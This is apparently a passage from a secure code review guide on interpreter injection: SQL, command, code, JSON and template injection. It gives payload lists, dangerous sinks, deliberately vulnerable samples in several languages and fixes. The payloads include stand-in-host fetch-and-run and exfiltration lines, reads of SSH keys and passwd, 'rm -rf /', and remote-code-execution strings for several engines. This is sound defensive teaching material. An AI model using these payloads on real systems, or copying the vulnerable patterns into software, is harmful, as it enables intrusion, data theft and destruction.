---
title: "4.2 Code Reference — Review Interpreter Injection"
description: >
  Payloads, sinks, multi-language examples, and fixes for Review Interpreter Injection.
---

# 4.2 Code Reference — Review Interpreter Injection

## SQL injection {: #sql }

From former `4-04-review-sql-injection.md`. **Guiding chapter section:** [4.2 - Review Interpreter Injection § SQL injection](../../4-02-review-interpreter-injection.md#sql).

# 4.4 Code Reference — Review SQL Injection

## Attack Payloads

Use these in authorized tests against login, search, and filter parameters. Syntax varies by database engine—confirm the backend before relying on a single payload.

### Pattern 1: Authentication bypass (string context)

```sql
admin'--
' OR '1'='1'--
' OR 1=1 LIMIT 1--
guest' OR 'x'='x
```

### Pattern 2: Comment termination

```sql
'; DELETE FROM audit_log WHERE '1'='1
report' /* */ OR 1=1--
# MySQL comment on filter value
```

### Pattern 3: UNION-based extraction

```sql
' UNION SELECT email, api_key FROM integrations--
' UNION SELECT NULL, column_name FROM information_schema.columns--
```

### Pattern 4: Boolean-based blind

```sql
' AND (SELECT COUNT(*) FROM users)>0--
' AND (SELECT SUBSTRING(api_key,1,1) FROM secrets LIMIT 1)='a'--
' AND 1=2--
```

### Pattern 5: Time-based blind

```sql
'; WAITFOR DELAY '0:0:5';--
' OR IF(1=1,BENCHMARK(5000000,SHA1('x')),0)--
'; SELECT pg_sleep(5);--
```

### Pattern 6: Stacked queries (when supported)

```sql
'; UPDATE orders SET total=0 WHERE id=1;--
```

## Language-Specific Sinks and Dangerous APIs

### Python

```python
cursor.execute(f"SELECT * FROM orders WHERE status = '{status}' ORDER BY {sort_col}")
cursor.execute("SELECT * FROM reports WHERE region = '%s'" % region)
db.engine.execute("SELECT ... WHERE created_at > " + start_date)
Model.objects.raw(f"SELECT ... {filter_clause}")
session.execute(text(f"SELECT ... ORDER BY {user_sort}"))
```

ORM escape hatches: `.extra(order_by=...)`, `RawSQL`, `connection.cursor().execute(string)`.

### Java

```java
stmt.executeQuery("SELECT * FROM invoices WHERE customer = '" + customer + "'");
PreparedStatement ps = conn.prepareStatement("SELECT * FROM sales ORDER BY " + sortColumn);
entityManager.createNativeQuery("... WHERE " + userFilter);
```

MyBatis: `${column}` in XML mappers (unsafe interpolation) vs `#{column}` (bound).

### C#

```csharp
cmd.CommandText = $"SELECT * FROM Reports WHERE Region = '{region}' ORDER BY {sort}";
context.Database.ExecuteSqlRaw($"DELETE FROM exports WHERE id = {exportId}");
FromSqlRaw($"SELECT * FROM metrics WHERE {userClause}");
```

Dapper: only safe when SQL uses `@param` with object properties—not string-built SQL.

### JavaScript

```javascript
db.query(`SELECT * FROM events WHERE type = '${req.query.type}' ORDER BY ${req.query.sort}`);
connection.query("SELECT * FROM logs WHERE level = '" + level + "'");
knex.raw(`SELECT * FROM shipments WHERE ${userWhere}`);
```

### Go

```go
db.Query(fmt.Sprintf("SELECT * FROM orders WHERE region = '%s'", region))
db.Exec("SELECT * FROM reports ORDER BY " + sortCol)
```

### SQL (dynamic fragments in migrations, reports, BI tools)

```sql
EXEC('SELECT * FROM sales WHERE quarter = ''' + @quarter + ''' ORDER BY ' + @sortCol);
ORDER BY @userSortColumn;  -- identifier injection if not allowlisted
```

### C

```c
sprintf(query, "SELECT * FROM audit WHERE id = %s ORDER BY %s", audit_id, sort_col);
sqlite3_exec(db, query, ...);
```

## Vulnerable Examples in Other Languages

### Java

```java
public List<Order> exportByRegion(String region, String sortColumn) throws SQLException {
    String sql = "SELECT id, total, region FROM orders WHERE region = '"
               + region + "' ORDER BY " + sortColumn;
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(sql);
    return mapOrders(rs);
}
```

### C#

```csharp
public IEnumerable<ReportRow> GetReport(string region, string sort)
{
    var sql = $"SELECT id, amount FROM sales WHERE region = '{region}' ORDER BY {sort}";
    using var cmd = new SqlCommand(sql, _connection);
    using var reader = cmd.ExecuteReader();
    return MapRows(reader);
}
```

### SQL

```sql
-- Dynamic report SQL built inside the database (concatenated parameters)
CREATE PROCEDURE dbo.ExportSales @region NVARCHAR(64), @sort NVARCHAR(64)
AS
BEGIN
    DECLARE @sql NVARCHAR(MAX) =
        N'SELECT id, amount FROM sales WHERE region = ''' + @region
        + N''' ORDER BY ' + @sort;
    EXEC(@sql);
END;
```

```sql
-- Second-order: stored filter value breaks a later batch query
SELECT * FROM exports
WHERE criteria LIKE '%' + (SELECT saved_filter FROM user_prefs WHERE id = @uid) + '%';
```

### Go

```go
func exportOrders(db *sql.DB, region, sortCol string) ([]Order, error) {
    query := fmt.Sprintf(
        "SELECT id, total FROM orders WHERE region = '%s' ORDER BY %s",
        region, sortCol,
    )
    rows, err := db.Query(query)
    if err != nil {
        return nil, err
    }
    defer rows.Close()
    return scanOrders(rows)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Use DB-API parameterized queries or ORM filters. Never interpolate user strings into SQL text.

```python
@app.route("/reports/export")
def export_report():
    region = request.args.get("region", "")
    sort = request.args.get("sort", "created_at")
    cursor = db.cursor()
    cursor.execute(
        "SELECT id, total, region FROM orders WHERE region = ? ORDER BY created_at",
        (region,),
    )
    return jsonify(cursor.fetchall())
```

```python
# SQLAlchemy — prefer ORM filters or bound text():
from sqlalchemy import text

session.execute(
    text("SELECT id, total FROM orders WHERE region = :region ORDER BY created_at"),
    {"region": region},
)
```

**Important:** Dynamic column or table names cannot use `?` placeholders. Map user choices to a fixed allowlist before query assembly.

```python
ALLOWED_SORT = {"created_at", "total", "region"}
sort = request.args.get("sort", "created_at")
if sort not in ALLOWED_SORT:
    sort = "created_at"
cursor.execute(f"SELECT id, total, region FROM orders ORDER BY {sort}")  # sort is allowlisted only
```

### Java

Bind user values with `PreparedStatement` setters.

```java
String sql = "SELECT id, total FROM orders WHERE region = ? ORDER BY created_at";
PreparedStatement ps = connection.prepareStatement(sql);
ps.setString(1, region);
ResultSet rs = ps.executeQuery();
```

```java
// Spring JdbcTemplate
jdbcTemplate.query(
    "SELECT id, amount FROM sales WHERE region = ?",
    rs -> mapRow(rs),
    region
);
```

**Important:** In MyBatis, `#{}` binds safely; `${}` performs string substitution and is unsafe for user input.

### C#

Use ADO.NET parameters with `@param` placeholders.

```csharp
var sql = "SELECT id, amount FROM sales WHERE region = @region";
using var cmd = new SqlCommand(sql, _connection);
cmd.Parameters.AddWithValue("@region", region);
using var reader = cmd.ExecuteReader();
```

```csharp
// Entity Framework Core — prefer LINQ:
var rows = _db.Sales.Where(s => s.Region == region).OrderBy(s => s.CreatedAt);
```

**Important:** `FromSqlRaw` with string interpolation is unsafe. Use `FromSqlRaw` with explicit `SqlParameter` objects or LINQ.

### Go

Use `database/sql` placeholders. Never build query strings with user input.

```go
row := db.QueryRow("SELECT id, total FROM orders WHERE region = ?", region)
```

```go
// sqlx named query
query := `SELECT id, amount FROM sales WHERE region = :region`
rows, err := db.NamedQuery(query, map[string]interface{}{"region": region})
```

**Important:** GORM `Raw(fmt.Sprintf(...))` with user input is equivalent to concatenation. Use chain methods or bound arguments.

## Command injection {: #command }

From former `4-05-review-command-injection.md`. **Guiding chapter section:** [4.2 - Review Interpreter Injection § Command injection](../../4-02-review-interpreter-injection.md#command).

# 4.5 Code Reference — Review Command Injection

## Attack Payloads

Use these payloads in security tests when a parameter reaches a shell or `shell=True` subprocess. Replace `TARGET` with the vulnerable parameter (hostname, filename, report id, etc.).

### Pattern 1: Command separator (`;`)

```text
INPUT=sample.wav; id
INPUT=logo.png; cat /etc/passwd
```

Becomes: `ffmpeg -i sample.wav; id -f mp3 out.mp3` when embedded in a shell string.

### Pattern 2: Pipes and logical operators (`|`, `||`, `&&`)

```text
INPUT=clip.mp4 | whoami
INPUT=doc.pdf && curl https://attacker.example/exfil
INPUT=false || wget -O- https://attacker.example/s.sh | sh
```

### Pattern 3: Command substitution (`` `cmd` ``, `$(cmd)`)

```text
INPUT=$(id)
INPUT=`cat ~/.ssh/id_rsa`
```

### Pattern 4: Newline and argument injection

```text
INPUT=clip.mp4%0aid
INPUT=-y -i x; id
```

Some parsers treat `%0a` or embedded newlines as extra commands when input is passed to `sh -c`.

### Pattern 5: Path and flag injection (non-shell argv)

Even without a shell, extra argv tokens may be injected when the app splits poorly:

```text
filename=report.pdf;rm -rf /
filename=--output=/tmp/pwned
```

## Language-Specific Sinks and Dangerous APIs

Search the codebase for these call patterns. Any path that concatenates or interpolates user input into the command or enables a shell is a review priority.

### Python

```python
import os, subprocess

os.system(user_input)
os.popen(f"ffmpeg -i {filename} out.mp3")
subprocess.call(f"tar czf {archive_name} uploads/", shell=True)
subprocess.run(cmd_string, shell=True)          # cmd_string contains user data
subprocess.check_output(user_cmd, shell=True)
asyncio.create_subprocess_shell(user_cmd)
```

Also review wrappers: `fabric`, `plumbum`, `invoke.run(..., shell=True)`.

### Java

```java
Runtime.getRuntime().exec("ping -c 3 " + host);
Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "ping " + host});
new ProcessBuilder("/bin/sh", "-c", userCmd).start();
```

`ProcessBuilder` is safe only when **each argument is fixed or allowlisted**—not when user data is inside `-c` strings.

### C#

```csharp
Process.Start("cmd.exe", $"/c ping {host}");
Process.Start(new ProcessStartInfo { FileName = "sh", Arguments = $"-c \"{userCmd}\"" });
```

Avoid `UseShellExecute = true` with user-influenced `Arguments`.

### JavaScript (Node.js)

```javascript
const { exec, execSync, spawn } = require('child_process');
exec(`ping -c 3 ${req.query.host}`);
execSync(userCmd);
spawn(userCmd, { shell: true });
```

### Go

```go
exec.Command("sh", "-c", "ping -c 3 "+host).Run()
exec.Command(userBinary, userArgs...).Run() // userArgs contains ; if split wrong
```

### Shell (scripts invoked by the app)

```bash
ping -c 3 "$host"           # host='x; id'
convert "$file"               # unquoted: convert $file
eval "$user_filter"
```

### C

```c
system(user_buffer);
popen(cmd_line, "r");
execl("/bin/sh", "sh", "-c", constructed, NULL);
```

## Vulnerable Examples in Other Languages

### Java

```java
public void resizeImage(String userFilename) throws IOException {
    // User supplies "../../etc/passwd; id" as "filename"
    String[] cmd = { "/bin/sh", "-c", "convert uploads/" + userFilename + " -resize 50% out.png" };
    Runtime.getRuntime().exec(cmd);
}
```

### C#

```csharp
public string RunTraceroute(string target)
{
    var psi = new ProcessStartInfo("cmd.exe", $"/c tracert {target}")
    {
        RedirectStandardOutput = true,
        UseShellExecute = false
    };
    using var proc = Process.Start(psi);
    return proc.StandardOutput.ReadToEnd();
}
```

### Shell

```bash
#!/bin/bash
# CGI or cron wrapper: host comes from query string / env
host="$QUERY_HOST"
ping -c 3 "$host"   # host=127.0.0.1; id
```

```sh
# One-liner invoked from app code: nslookup example.com; cat /etc/passwd
nslookup $1
```

### Go

```go
func cloneRepo(w http.ResponseWriter, r *http.Request) {
    repo := r.FormValue("repo_url") // https://x.com/a.git; curl attacker.com/s.sh|sh
    cmd := exec.Command("git", "clone", repo, "/tmp/work")
    out, _ := cmd.CombinedOutput()
    w.Write(out)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Invoke binaries with an argument list. Never pass user input through a shell.

```python
import re
import subprocess

FILENAME_PATTERN = re.compile(r"^[a-zA-Z0-9._-]{1,128}$")

@app.route("/media/transcode")
def transcode():
    filename = request.args.get("file", "")
    if not FILENAME_PATTERN.fullmatch(filename):
        return "Invalid filename", 400
    src = os.path.join("/var/uploads", filename)
    output = subprocess.run(
        ["ffmpeg", "-y", "-i", src, "-f", "mp3", "/tmp/out.mp3"],
        check=True,
        capture_output=True,
        timeout=60,
    )
    return output.stdout
```

**Important:** `shlex.quote` is a secondary defense only. Prefer argv lists and strict allowlists over quoting into shell strings.

```python
# Prefer native libraries when possible:
from pydub import AudioSegment
AudioSegment.from_file(src).export("/tmp/out.mp3", format="mp3")
```

### Java

Use `ProcessBuilder` with a fixed binary path and separate arguments.

```java
public void pingHost(String hostname) throws IOException, InterruptedException {
    if (!hostname.matches("[a-zA-Z0-9.-]{1,253}")) {
        throw new IllegalArgumentException("Invalid host");
    }
    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "3", hostname);
    pb.redirectErrorStream(true);
    Process p = pb.start();
    p.waitFor();
}
```

**Important:** Never embed user input in `-c` command strings. Each argument must be a separate list element.

### C#

Use `ProcessStartInfo.ArgumentList` instead of `/c` command strings.

```csharp
public string RunPing(string target)
{
    if (!Regex.IsMatch(target, @"^[a-zA-Z0-9.-]{1,253}$"))
        throw new ArgumentException("Invalid host");

    var psi = new ProcessStartInfo
    {
        FileName = "ping",
        RedirectStandardOutput = true,
        UseShellExecute = false
    };
    psi.ArgumentList.Add("-c");
    psi.ArgumentList.Add("3");
    psi.ArgumentList.Add(target);
    using var proc = Process.Start(psi);
    return proc!.StandardOutput.ReadToEnd();
}
```

**Important:** Avoid `UseShellExecute = true` when user-influenced arguments are involved.

### Go

Pass arguments separately. Never use `sh -c` with concatenated user input.

```go
var hostPattern = regexp.MustCompile(`^[a-zA-Z0-9.-]{1,253}$`)

func pingHandler(w http.ResponseWriter, r *http.Request) {
    host := r.URL.Query().Get("host")
    if !hostPattern.MatchString(host) {
        http.Error(w, "invalid host", http.StatusBadRequest)
        return
    }
    cmd := exec.Command("ping", "-c", "3", host)
    out, err := cmd.CombinedOutput()
    if err != nil {
        http.Error(w, "ping failed", http.StatusInternalServerError)
        return
    }
    w.Write(out)
}
```

**Important:** Set context timeouts on subprocess calls to limit abuse windows.

## Code injection {: #code }

From former `4-06-review-code-injection.md`. **Guiding chapter section:** [4.2 - Review Interpreter Injection § Code injection](../../4-02-review-interpreter-injection.md#code).

# 4.6 Code Reference — Review Code Injection

## Attack Payloads

Use these in authorized tests when user input reaches an evaluator. Replace `TARGET` with the vulnerable parameter. Confirm the runtime language before relying on a single payload.

### Pattern 1: Python rule-engine expression injection

```python
eval(user_formula)  # user_formula = "__import__('os').system('whoami')"
```

### Pattern 1b: `exec` on workflow snippet from JSON

```python
exec(config["on_complete_hook"], globals())
```

### Pattern 2: JavaScript / Node eval

```javascript
process.mainModule.require('child_process').execSync('id')
global.process.mainModule.require('fs').readFileSync('/etc/passwd')
Function('return this')().constructor.constructor('return process')().mainModule.require('child_process').exec('id')
```

### Pattern 3: Java ScriptEngine / Groovy

```java
java.lang.Runtime.getRuntime().exec("id")
new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\A").next()
```

### Pattern 4: Spring SpEL

```text
T(java.lang.Runtime).getRuntime().exec('id')
#{T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.Runtime).getRuntime().exec('id')}
```

### Pattern 5: OGNL (Struts-style)

```text
(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))
(@java.lang.Runtime@getRuntime().exec('id'))
```

### Pattern 6: Deserialization and unsafe loaders (code execution paths)

```python
pickle.loads(user_bytes)
yaml.load(user_yaml)  # PyYAML unsafe
```

## Language-Specific Sinks and Dangerous APIs

Search for evaluation primitives that compile or execute user-supplied strings. Any path that concatenates request data into expression text is a review priority.

### Python

```python
result = eval(user_expr)
exec(user_code)
compile(user_snippet, "<string>", "exec")
pickle.loads(request.data)
yaml.load(body)  # without Loader=SafeLoader
```

### Java

```java
ScriptEngine engine = new ScriptEngineManager().getEngineByName("javascript");
engine.eval(userRule);
ExpressionParser parser = new SpelExpressionParser();
parser.parseExpression(userInput).getValue();
Ognl.getValue(userExpr, context);
```

### C#

```csharp
CSharpScript.EvaluateAsync(userCode);
Microsoft.JScript.Eval.JScriptEvaluate(userExpr, engine);
Assembly.Load(userAssemblyBytes);
```

### JavaScript

```javascript
eval(req.body.expr);
new Function(userCode)();
vm.runInNewContext(userSnippet);
require('vm').runInThisContext(userInput);
```

### Go

```go
// Less common — review plugin/script hooks and text/template misuse:
plugin.Open(userPath)
text/template.Must(template.New("t").Parse(userTemplate)).Execute(w, data)
```

### Shell (embedded interpreters)

```bash
python3 -c "$user_expr"
node -e "$user_js"
ruby -e "$user_ruby"
```

## Vulnerable Examples in Other Languages

### Java

```java
public boolean evaluateWorkflowRule(String userRule, Map<String, Object> ctx)
        throws ScriptException {
    ScriptEngine engine = new ScriptEngineManager().getEngineByName("groovy");
    String expression = "status == 'approved' && " + userRule;
    return (Boolean) engine.eval(expression, new SimpleBindings(ctx));
}
```

### C#

```csharp
public decimal EvaluateShippingFormula(string userFormula, decimal weight)
{
    var engine = new Microsoft.ClearScript.V8.V8ScriptEngine();
    engine.AddHostObject("weight", weight);
    return Convert.ToDecimal(engine.Evaluate(userFormula));
}
```

### JavaScript

```javascript
const express = require("express");
const app = express();

app.post("/rules/test", (req, res) => {
  const formula = req.body.formula || "0";
  const ctx = { orderTotal: req.body.orderTotal };
  res.send(String(eval(`with(ctx){${formula}}`))); // attacker-controlled expression
});
```

### Go

```go
func evaluatePricingRule(w http.ResponseWriter, r *http.Request) {
    rule := r.FormValue("rule")
    vm := goja.New()
    vm.Set("subtotal", parseFloat(r.FormValue("subtotal")))
    val, err := vm.RunString("(" + rule + ")")
    if err != nil {
        http.Error(w, err.Error(), 500)
        return
    }
    fmt.Fprint(w, val)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Avoid `eval` and `exec` on untrusted strings. Use restricted evaluators or fixed server-side logic.

```python
from simpleeval import simple_eval

@app.route("/billing/discount")
def apply_discount():
    body = request.get_json()
    rule = body.get("formula", "0")
    subtotal = body.get("subtotal", 0)
    try:
        discount = simple_eval(rule, names={"subtotal": subtotal})
    except Exception:
        return "Invalid formula", 400
    return str(discount)
```

```python
# ast.literal_eval — literals only, not expressions:
import ast
data = ast.literal_eval('{"key": "value"}')  # safe for literal structures
```

**Important:** `simpleeval` limits semantics but is not a full sandbox for hostile admin input. Prefer fixed formulas implemented in Python for untrusted users.

### Java

Replace `ScriptEngine.eval` on user input with arithmetic-only libraries or fixed Java code.

```java
import net.objecthunter.exp4j.Expression;
import net.objecthunter.exp4j.ExpressionBuilder;

public double evaluateShipping(double weightKg, double distanceKm) {
    Expression expr = new ExpressionBuilder("base + weight * rate + distance * perKm")
        .variables("base", "weight", "rate", "distance", "perKm")
        .build();
    return expr.setVariable("weight", weightKg)
        .setVariable("distance", distanceKm)
        .setVariable("base", 5.0)
        .setVariable("rate", 0.8)
        .setVariable("perKm", 0.05)
        .evaluate();
}
```

**Important:** Bind variables through a sandboxed API. Never concatenate user strings into expression text.

### C#

Use expression parsers limited to math and boolean logic instead of full script engines.

```csharp
using NCalc;

public object EvaluateFormula(string expression, Dictionary<string, object> parameters)
{
    var expr = new Expression(expression);
    foreach (var kv in parameters)
        expr.Parameters[kv.Key] = kv.Value;
    return expr.Evaluate();
}
```

**Important:** Avoid ClearScript or Roslyn on user text unless heavily sandboxed, authorized, and audited.

### Go

Use a typed expression language with limited builtins instead of full JavaScript runtimes.

```go
import "github.com/expr-lang/expr"

func evaluateFormula(input string, env map[string]interface{}) (interface{}, error) {
    program, err := expr.Compile(input, expr.Env(env))
    if err != nil {
        return nil, err
    }
    return expr.Run(program, env)
}
```

**Important:** Avoid `RunString` on user input in goja, Otto, or yaegi unless in a hardened sandbox with no host bindings.

## JSON injection {: #json }

From former `4-07-review-json-injection.md`. **Guiding chapter section:** [4.2 - Review Interpreter Injection § JSON injection](../../4-02-review-interpreter-injection.md#json).

# 4.7 Code Reference — Review JSON Injection

## Attack Payloads

Use these in authorized tests when user input is concatenated into JSON or merged into parsed objects. Confirm whether the backend uses a strict schema before relying on a single payload.

### Pattern 1: String termination and field injection

```json
","tenant_id":"999","x":"
","is_billing_admin":true,"note":"
```

Built manually: `{"note":"PAYLOAD","invoice_id":42}` where `PAYLOAD` closes the string and adds keys.

### Pattern 2: Prototype pollution (JavaScript merge sinks)

```json
{"__proto__":{"canApproveInvoices":true}}
{"constructor":{"prototype":{"tenant":"evil"}}}
{"__proto__":{"skipFraudCheck":true}}
```

### Pattern 3: Mass-assignment privilege escalation

```json
{"invoice_id":1001,"status":"paid","approved_by":"attacker"}
{"line_total":0,"tax_rate":0,"currency":"USD"}
{"owner_org_id":1,"target_org_id":999}
```

### Pattern 4: Array and type confusion

```json
{"line_items":[1,2,"'); DROP TABLE invoices;--"]}
{"amount":"99.99","amount":0.01}
{"auto_renew":"false"}
```

### Pattern 5: Nested object injection

```json
{"metadata":{"source":"webhook"},"billing":{"write_off":true}}
{"payload":{"__proto__":{"admin":true}}}
```

### Pattern 6: JSON inside JSON (double encoding)

```text
%7B%22status%22%3A%22paid%22%7D
{\"status\":\"paid\"}
```

## Language-Specific Sinks and Dangerous APIs

Search for manual JSON construction and untyped object merges. Any path that trusts client keys without schema validation is a review priority.

### Python

```python
payload = f'{{"note":"{note}","invoice_id":{inv_id}}}'
data = json.loads(raw)  # then data.update(request.json)
Invoice(**request.get_json())  # accepts all keys if model allows
webhook = {**defaults, **request.json}
```

### Java

```java
String json = "{\"name\":\"" + name + "\"}";
ObjectMapper mapper = new ObjectMapper();
Map<String, Object> body = mapper.readValue(input, Map.class);
BeanUtils.copyProperties(clientDto, serverEntity);
```

### C#

```csharp
var json = $"{{\"role\":\"{role}\"}}";
var obj = JsonConvert.DeserializeObject<Dictionary<string, object>>(body);
// Mass assignment:
_mapper.Map(clientModel, entity);
```

### JavaScript (Node.js)

```javascript
const body = `{ "name": "${req.body.name}" }`;
Object.assign(target, req.body);
lodash.merge(config, JSON.parse(userJson));
target.__proto__ = parsed.__proto__;
```

### Go

```go
payload := fmt.Sprintf(`{"name":"%s"}`, name)
json.Unmarshal(body, &map[string]interface{}{})
decoder.DisallowUnknownFields() // missing = accepts extra keys
```

### SQL (JSON columns)

```sql
UPDATE users SET profile = profile || user_json_fragment;
JSON_SET(profile, CONCAT('$.', user_key), user_value);
```

## Vulnerable Examples in Other Languages

### Java

```java
@PostMapping("/webhooks/invoice")
public ResponseEntity<String> relayInvoice(@RequestBody String raw) {
    String json = "{\"vendor\":\"" + extractVendor(raw) + "\",\"payload\":" + raw + "}";
    eventBus.publish("invoice-events", json);
    return ResponseEntity.ok(json);
}

@PostMapping("/invoices/{id}/adjust")
public Invoice adjust(@PathVariable long id, @RequestBody Map<String, Object> body) {
    Invoice invoice = invoiceRepo.findById(id);
    invoice.setStatus((String) body.get("status")); // attacker sends "status": "paid"
    invoice.setWriteOff((Double) body.get("write_off"));
    return invoiceRepo.save(invoice);
}
```

### C#

```csharp
[HttpPost("webhooks/billing")]
public IActionResult RelayBillingEvent([FromBody] JsonElement body)
{
    var json = $"{{\"event\":\"{body.GetProperty("event")}\",\"amount\":{body.GetProperty("amount")},\"memo\":\"{body.GetProperty("memo")}\"}}";
    _queue.Publish(json);
    return Ok(json);
}

[HttpPatch("subscriptions/{id}")]
public IActionResult PatchSubscription(int id, [FromBody] Dictionary<string, object> fields)
{
    var sub = _db.Subscriptions.Find(id);
    foreach (var kv in fields)
        typeof(Subscription).GetProperty(kv.Key)?.SetValue(sub, kv.Value);
    _db.SaveChanges();
    return Ok(sub);
}
```

### JavaScript

```javascript
app.post("/api/webhooks/invoice", (req, res) => {
  const memo = req.body.memo;
  const payload = `{"memo":"${memo}","invoice_id":${req.body.invoice_id}}`;
  broker.publish("invoice-events", payload);
  res.type("json").send(payload);
});

app.patch("/api/invoices/:id", (req, res) => {
  Object.assign(currentInvoice, req.body); // merges attacker keys (e.g. status, write_off)
  saveInvoice(currentInvoice);
  res.json(currentInvoice);
});
```

### Go

```go
func relayWebhook(w http.ResponseWriter, r *http.Request) {
    memo := r.FormValue("memo")
    invoiceID := r.FormValue("invoice_id")
    payload := fmt.Sprintf(`{"memo":"%s","invoice_id":%s}`, memo, invoiceID)
    queue.Publish("invoice-events", payload)
    w.Write([]byte(payload))
}

func patchInvoice(w http.ResponseWriter, r *http.Request) {
    var patch map[string]interface{}
    json.NewDecoder(r.Body).Decode(&patch)
    inv := loadInvoice(invoiceIDFromPath(r))
    mergeMap(inv, patch) // copies attacker keys into struct via reflection
    saveInvoice(inv)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Build structures as dicts, then serialize with `json.dumps`. Never f-string JSON.

```python
import json

@app.route("/api/webhooks/invoice", methods=["POST"])
def relay_invoice_webhook():
    note = request.form["note"]
    invoice_id = int(request.form["invoice_id"])
    payload = json.dumps({"note": note, "invoice_id": invoice_id})
    queue.publish("invoice-events", payload)
    return payload
```

```python
from pydantic import BaseModel, ConfigDict, Field

class InvoiceAdjust(BaseModel):
    model_config = ConfigDict(extra="forbid")
    memo: str = Field(max_length=256)

@app.route("/invoices/<int:inv_id>/memo", methods=["PATCH"])
def patch_invoice_memo(inv_id):
    data = InvoiceAdjust.model_validate(request.get_json())
    invoice = load_invoice(inv_id)
    invoice.memo = data.memo  # explicit fields only
    db.session.commit()
    return jsonify({"memo": invoice.memo})
```

**Important:** Never `__dict__.update(request.json)` on persisted entities. Use separate read and write models.

### Java

Serialize with Jackson. Bind to typed DTOs with unknown fields rejected.

```java
import com.fasterxml.jackson.databind.ObjectMapper;

ObjectMapper mapper = new ObjectMapper();
String json = mapper.writeValueAsString(Map.of(
    "note", note,
    "invoiceId", invoiceId
));
```

```java
@JsonIgnoreProperties(ignoreUnknown = true)
public record InvoiceAdjustRequest(
    @NotBlank @Size(max = 256) String memo
    // status and write_off are NOT accepted from client — computed server-side
) {}
```

**Important:** Avoid raw `Map<String,Object>` for security-sensitive endpoints. Use typed records with Bean Validation.

### C#

Serialize typed objects. Reject unknown members on sensitive models.

```csharp
var payload = JsonSerializer.Serialize(new BillingWebhookMessage
{
    Event = dto.Event,
    Amount = dto.Amount,
    Tax = ComputeTax(dto.Sku, UserId) // server-computed
});
```

```csharp
// Strict deserialization:
var options = new JsonSerializerOptions { UnmappedMemberHandling = JsonUnmappedMemberHandling.Disallow };
var dto = JsonSerializer.Deserialize<InvoiceMemoRequest>(body, options);
```

**Important:** Audit `[JsonExtensionData]` on sensitive models. Unexpected keys must not silently capture privileged fields.

### Go

Unmarshal into typed structs. Disallow unknown fields for strict parsing.

```go
func relayWebhook(w http.ResponseWriter, r *http.Request) {
    var req InvoiceWebhookRequest
    dec := json.NewDecoder(r.Body)
    dec.DisallowUnknownFields()
    if err := dec.Decode(&req); err != nil {
        http.Error(w, "invalid json", http.StatusBadRequest)
        return
    }
    payload, _ := json.Marshal(map[string]interface{}{
        "memo":       req.Memo,
        "invoice_id": req.InvoiceID,
    })
    w.Write(payload)
}
```

**Important:** Avoid `map[string]interface{}` for auth or billing endpoints. Use separate input structs from persistence models.

## Server-side template injection {: #ssti }

From former `4-10-review-ssti.md`. **Guiding chapter section:** [4.2 - Review Interpreter Injection § Server-side template injection](../../4-02-review-interpreter-injection.md#ssti).

# 4.10 Code Reference — Review SSTI

## Attack Payloads

Use these in authorized tests when user input reaches template source or expression slots. A math probe that returns `49` confirms evaluation. Replace probes with impact payloads only in authorized environments.

### Pattern 1: Detection probes (math evaluation)

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
${{7*7}}
*{7*7}
```

### Pattern 2: Jinja2 / Flask

```jinja2
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Pattern 3: Twig (PHP)

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

### Pattern 4: Freemarker (Java)

```freemarker
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Pattern 5: Thymeleaf / Spring

```text
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
${T(java.lang.Runtime).getRuntime().exec('id')}
```

### Pattern 6: Pebble / Velocity / Razor-style

```text
{% set cmd = 'id' %}{% import cmd %}
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
@(1+2); System.Diagnostics.Process.Start("cmd.exe","/c id");
```

## Language-Specific Sinks and Dangerous APIs

Search for compile-from-string and expression evaluation in template engines. User data must stay in the data layer, never in template syntax.

### Python (Jinja2)

```python
Template("Hello {{ " + name + " }}").render()
env.from_string(user_template).render()
render_template_string(user_html)
Environment(autoescape=False).from_string(user_src)
```

### Java (Thymeleaf / Freemarker / Velocity)

```java
templateEngine.process(userTemplate, context);
cfg.getTemplate(userPath).process(data, writer);
Velocity.evaluate(context, writer, "", userSnippet);
```

### C# (Razor)

```csharp
var result = Razor.Parse(userTemplate);
Engine.Razor.RunCompile(userContent, "dynamic", null, model);
@Html.Raw(userTemplate)  // when template source is user-controlled
```

### JavaScript (Handlebars / EJS / Nunjucks)

```javascript
handlebars.compile(userTemplate)(data);
ejs.render(userTemplate, data);
nunjucks.renderString(userTemplate, data);
```

### Go (text/template vs html/template)

```go
tmpl, _ := template.New("t").Parse(userTemplate)  // text/template executes code
tmpl.Execute(w, data)
```

### HTML (server-side includes with expression engines)

```jsp
<c:set var="tpl" value="${param.template}"/>
${userExpression}  <!-- EL evaluated server-side -->
```

## Vulnerable Examples in Other Languages

### Java

```java
public String renderNewsletterPreview(String userSubject, Map<String, Object> ctx) {
    Configuration cfg = new Configuration(Configuration.VERSION_2_3_32);
    Template tpl = new Template("preview", "Newsletter: ${subject}", cfg);
    ctx.put("subject", userSubject); // userSubject may contain ${...} directives
    StringWriter out = new StringWriter();
    tpl.process(ctx, out);
    return out.toString();
}
```

### C#

```csharp
public IActionResult PreviewInvoice([FromForm] string headerHtml)
{
    var engine = new RazorLightEngineBuilder()
        .UseMemoryCachingProvider()
        .Build();
    var html = engine.CompileRenderStringAsync(
        Guid.NewGuid().ToString(), headerHtml, model).Result;
    return Content(html, "text/html");
}
```

### HTML

```html
<!-- Admin email preview compiles user-supplied header as template source -->
<form action="/email/preview" method="post">
  <textarea name="header">Invoice {{invoice_id}}</textarea>
  <!-- Attacker adds {{7*7}} or engine-specific directives -->
</form>

<!-- Notification builder treats stored snippet as template source -->
